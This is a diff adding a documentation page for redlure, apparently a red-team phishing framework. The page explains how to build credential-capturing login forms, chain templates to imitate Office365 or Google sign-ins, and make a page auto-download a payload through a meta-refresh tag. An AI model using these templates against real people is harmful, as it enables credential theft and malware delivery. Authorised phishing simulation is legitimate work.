@@ -436,7 +436,69 @@
     
                                 <section class="normal markdown-section">
                                 
-                                
+                                <h1 id="pages">Pages</h1>
+<p>The pages component is where you can store HTML templates to serve with your phishing campaigns. redlure lets you chain up to 4 templates together in 1 campaign (through the use of buttons or your mechanism of choice).</p>
+<p>You can attempt to clone an existing webpage or build your own template in the <a href="https://codemirror.net/" target="_blank">CodeMirror</a> editor.
+<img src="../gitbook/images/newpage.png" alt=""></p>
+<h1 id="important">IMPORTANT</h1>
+<p>Templates have three requirements to function the way you want, assuming you are collecting form data:</p>
+<ol>
+<li>The HTML <code>form</code> tag must have the <code>method</code> attribute set to <code>POST</code></li>
+<li>The HTML <code>form</code> tag must have the <code>action</code> attribute set to ``</li>
+<li><code>Input</code> fields you want to capture must have the <code>name</code> attribute set.</li>
+<li>The HTML form must include a button that submits the form (i.e. <code>input</code> tag with <code>type=&quot;submit&quot;</code>)</li>
+</ol>
+<p>Example:</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;{{ next_url }}&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-box&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-box&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span> 
+    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Sign In&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+</code></pre>
+<h2 id="chaining-templates">Chaining Templates</h2>
+<p>The <code>{{ next_url }}</code> variable is used within page templates to direct visitors to the next phishing template in sequence.</p>
+<h1 id="variable-usernameemail-passthrough">Variable (Username/Email) Passthrough</h1>
+<p>To mimic multi-page logins that display your username on the password form page (think Office365, Google), you can use to following variables within your HTML. These <strong><em>cannot</em></strong> be used on your first landing page in a sequence; a form with an input field named one of these values must be submitted on the prior page.</p>
+<ul>
+<li><code>` - Will display value from the prior page&apos;s form input where</code>name=&quot;loginfmt&quot;`</li>
+<li><code>` - Will display value from the prior page&apos;s form input where</code>name=&quot;email&quot;`</li>
+<li><code>` - Will display value from the prior page&apos;s form input where</code>name=&quot;username&quot;`</li>
+</ul>
+<h1 id="serving-a-payload">Serving a payload</h1>
+<p>When you configure a campaign you can optionally select a payload you&apos;ve uploaded to your server/worker and set a URL path for it to be served at. A link to the payload route can be sent directly via email or it can be referenced as a variable in your HTML page template, in 1 of 2 ways:</p>
+<ol>
+<li>Automatically download file when your page is browsed to</li>
+<li>Download the file when a button is pressed or another action is taken</li>
+</ol>
+<h2 id="auto-download-on-page-visit">Auto Download on Page Visit</h2>
+<p>To drop a payload when a visitor hits your redlure page, add the <code>{{ serve_payload }}</code> to your HTML page template. Example:</p>
+<pre><code class="lang-html"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
+
+     <span class="hljs-comment">&lt;!-- SNIPPED HTML CONTENT --&gt;</span>
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
+
+{{ serve_payload }}
+
+<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
+</code></pre>
+<p> When your page is rendered the variable with be replaced with:
+ <code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0; url=http[s]://yourdomain.com/custom/payload/path?id=[visitor_id]&quot;&gt;</code>
+This could be done by other means, such as directly inserting the <code>&lt;meta&gt;</code> tag in the page template, but I&apos;ve found this will usually throw WYSISYG editors for a loop when previewing your page.</p>
+<h2 id="download-on-action">Download on Action</h2>
+<p>If you want to place your payload download behind a click using a button or hyperlink, you can use the <code>{{ payload_url }}</code> within your page template. Example:</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;{{ payload_url }}&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;cursor: pointer;&quot;</span>&gt;</span>Click here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> if the download does not begin.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+
+<span class="hljs-comment">&lt;!-- OR --&gt;</span>
+
+<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;{{ payload_url }}&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;GET&quot;</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Download<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
+</code></pre>
+
                                 
                                 </section>
                             
@@ -479,7 +541,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Pages","level":"2.4.7","depth":2,"next":{"title":"Target Lists","level":"2.4.8","depth":2,"path":"redlure-console/target_lists.md","ref":"redlure-console/target_lists.md","articles":[]},"previous":{"title":"Emails","level":"2.4.6","depth":2,"path":"redlure-console/emails.md","ref":"redlure-console/emails.md","articles":[]},"dir":"neutral"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"redlure-console/pages.md","mtime":"2022-01-21T19:29:47.855Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-01-22T15:41:17.620Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Pages","level":"2.4.7","depth":2,"next":{"title":"Target Lists","level":"2.4.8","depth":2,"path":"redlure-console/target_lists.md","ref":"redlure-console/target_lists.md","articles":[]},"previous":{"title":"Emails","level":"2.4.6","depth":2,"path":"redlure-console/emails.md","ref":"redlure-console/emails.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"redlure-console/pages.md","mtime":"2022-01-22T16:12:18.218Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-01-22T16:25:08.730Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
